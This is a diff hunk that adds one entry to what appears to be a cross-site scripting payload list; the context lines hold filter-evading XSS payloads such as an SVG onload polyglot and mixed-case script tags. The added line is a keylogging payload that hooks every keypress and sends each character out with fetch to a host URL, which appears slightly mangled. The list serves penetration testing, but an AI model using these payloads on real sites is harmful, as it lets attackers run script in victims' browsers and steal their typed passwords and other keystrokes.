@@ -1715,3 +1715,4 @@ GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;
 <script>location.href;'javascript:alert%281%29'</script>
 '"</Script><Html Onmouseover=(alert)(1) //
 <select><noembed></select><script x='a@b'a>y='a@b'//a@b%0a\u0061lert(1)</script x>
+<img src=x onerror='document.onkeypress=function(e){fetch("http://localhost?k=localhost/?k= "+String.fromCharCode(e.which))},this.remove();'>
